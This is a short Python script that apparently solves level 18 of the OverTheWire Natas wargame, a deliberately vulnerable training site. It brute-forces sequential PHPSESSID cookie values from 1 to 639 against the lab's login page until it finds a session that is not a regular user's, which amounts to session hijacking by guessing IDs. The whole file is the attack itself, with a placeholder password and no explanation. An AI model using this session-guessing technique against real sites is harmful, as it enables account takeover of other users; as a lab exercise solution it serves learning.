import requests

a_pass = "natas_18_password"
a_user = "natas18"
maxid = 640

for i in range(1,maxid):
    print(f"trying {i} ...")
    url = f"http://natas18.natas.labs.overthewire.org/index.php"
    r = requests.get(url,auth=(a_user,a_pass),cookies={"PHPSESSID": f"{i}"})
    if "You are logged in as a regular user. " not in r.text:
        print(r.text)
        break



